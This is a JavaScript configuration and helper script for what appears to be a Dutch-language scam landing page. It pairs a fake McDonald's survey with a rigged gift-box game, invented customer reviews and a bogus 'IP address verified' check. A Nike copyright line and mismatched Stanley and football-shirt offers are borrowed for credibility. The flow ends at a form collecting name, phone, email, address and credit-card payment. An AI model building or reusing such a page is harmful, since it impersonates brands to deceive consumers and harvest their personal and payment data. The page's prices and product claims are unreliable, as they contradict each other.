const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "nl";
  const lang = "nl-NL";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Maat: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // IK VUL DEZE INFORMATIE IN IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `,
  Gefeliciteerd!<br><br>
  U heeft deelgenomen aan de Stanley promotie: u heeft de kans om de STANLEY QUENCHER H2.0 thermos met ijsmal te kopen voor slechts <b>37$</b>!
  `,
  };

  const notifications = [
    // {
    // 	user: "Manuel S*****",
    // 	location: "Barcelona, España",
    // 	action: "Ik heb zojuist het sieraad ontvangen voor 1,95 euro!",
    // 	timeago: "15 seconden geleden",
    // },
    // {
    // 	user: "Carlos B******",
    // 	location: "Madrid, España",
    // 	action: "Ik heb zojuist het sieraad ontvangen voor 1,95 euro!",
    // 	timeago: "25 seconden geleden",
    // },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "Een dag geleden",
      header: "Het is ongelooflijk!",
      product: "26468782",
      review: "Als voetbalfan sinds vele jaren was ik zeer verrast door de kwaliteit van het nationale teamshirt van Spanje voor een zeer redelijke prijs 😊",
    },
    {
      name: "Lucas",
      time: "Twee dagen geleden",
      header: "Geweldig! Ik heb geen woorden.",
      product: "26468789",
      review: "Ik besloot voor het eerst het nationale teamshirt van Spanje te kopen en nu geniet ik ervan elke keer als ik mijn team steun, dank je.",
    },
    {
      name: "Valentina",
      time: "Twee dagen geleden",
      header: "Gewoon geweldig.",
      product: "26468785",
      review: "De kwaliteit van het shirt is ongelooflijk, en de maat is perfect! Dank je, ik zal het aan mijn vrienden aanbevelen.",
    },
    {
      name: "Santiago",
      time: "Vier dagen geleden",
      header: "Ik vind het leuk",
      review: "Eerlijk gezegd hou ik van voetbal kijken, en het nieuwe nationale teamshirt van Spanje was precies wat ik nodig had.",
    },
    {
      name: "Martina",
      time: "Zeven dagen geleden",
      header: "Wauw, ik hou van dit product!",
      product: "26468784",
      review: "Eerst dacht ik dat het shirt duur was, maar gelukkig heb ik het gekocht en nu geniet ik van de beste wedstrijden met het. Dank je!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "BEOORDELINGEN EN RECENSIES",
    percent: "99%",
    rec: "Opmerkingen over deze promotie",
  };

  const questions = {
    _of: "Vraag {1} van {2}: ",
    arr: [
      {
        q: "Heeft u ooit producten van McDonald's besteld?",
        a: [
          "Ja, ik bestel vaak",
          "Ja, ik bestel zelden",
          "Ik heb nog nooit besteld",
        ],
      },
      {
        q: "Moet McDonald's doorgaan met dit soort reclamecampagnes?",
        a: ["Ja, natuurlijk!", "Ja, maar verander het promotionele menu", "Nee"],
      },
      {
        q: "Zou u onze producten aanbevelen aan uw vrienden?",
        a: ["Ja", "Nee"],
      },
    ],
  };

  const check = {
    title: "Uw antwoord wordt beoordeeld",
    arr: [
      "U heeft vraag 3 van 3 beantwoord",
      "Uw IP-adres toont geen eerdere bestellingen",
      "Uw antwoord is geverifieerd",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Bedankt voor het deelnemen aan de enquête!",
        button: "Probeer uw geluk",
        text: `
  <center>
      Om het promotionele menu van McDonald's te verkrijgen, moet u de juiste geschenkdoos kiezen.
      <br><br>
      U heeft 3 pogingen, veel succes!
  </center>
              `,
      },
    },
    first: {
      texts: {
        header: "Oh, nee...",
        button: "Probeer opnieuw",
        text: `
  <center>
      Helaas is dit geschenk leeg. U heeft nog twee pogingen, veel succes!
  </center>
              `,
      },
    },
    win: {
      texts: {
        header: "Engeland (Mannenteam) 2024/25 Stadion Thuis Shirt",
        button: "Krijg de coupon",
        text: `
  <center>
      <p style="color: #ffffff"></p>
      <br>
      Klik op "Krijg de coupon", vul het formulier in en betaal de bestelling.
      <br><br>
      Ontvang een sms met de coupon en instructies om deze te activeren.
      <br><br>
      De coupon kan op elk moment geactiveerd worden en vereist geen extra betaling.
  </center>
              `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Persoonlijke informatie",
      fields: {
        name: {
          enabled: true,
          field: "Voornaam",
        },
        family: {
          enabled: true,
          field: "Achternaam",
        },
        phone: {
          enabled: true,
          field: "Telefoonnummer",
        },
        email: {
          enabled: true,
          field: "E-mailadres",
        },
      },
    },
    delivery: {
      title: "Levering",
      fields: {
        city: {
          enabled: true,
          field: "Stad",
        },
        address: {
          enabled: true,
          field: "Leveringsadres",
        },
        zip: {
          enabled: true,
          field: "Postcode",
        },
      },
    },
    payment: {
      title: "Betaalmethoden",
      creditCard: "Online betaling met creditcard",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Bestelgegevens",
      oldPrice: "€99.99",
      newPrice: "€9.99",
      size: "Maat",
      subTotal: {
        title: "Subtotaal",
        amount: "€9.99",
      },
      delivery: {
        title: "Levering",
        amount: "€0.00",
      },
      total: {
        title: "Totaal",
        amount: "€9.99",
      },
      checkoutButton: "Betaal uw bestelling",
    },
  };



  const products = [
    {
      id: "26468784",
      name: "Nederland 2024/25 Stadium Thuis",
      miniImg: "./src/img/shirt-ne.jpg",
      images: ["./src/img/shirt-ne.jpg"],
    },
    {
      id: "26468782",
      name: "Nederland 2024/25 Stadium Thuis",
      miniImg: "./src/img/shirt-ne.jpg",
      images: ["./src/img/shirt-ne.jpg"],
    },
    {
      id: "26468783",
      name: "Nederland 2024/25 Stadium Thuis",
      miniImg: "./src/img/shirt-ne.jpg",
      images: ["./src/img/shirt-ne.jpg"],
    },
  ];

  const footer = {
    cr: "© 2024  Nike, Inc. Alle rechten voorbehouden",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});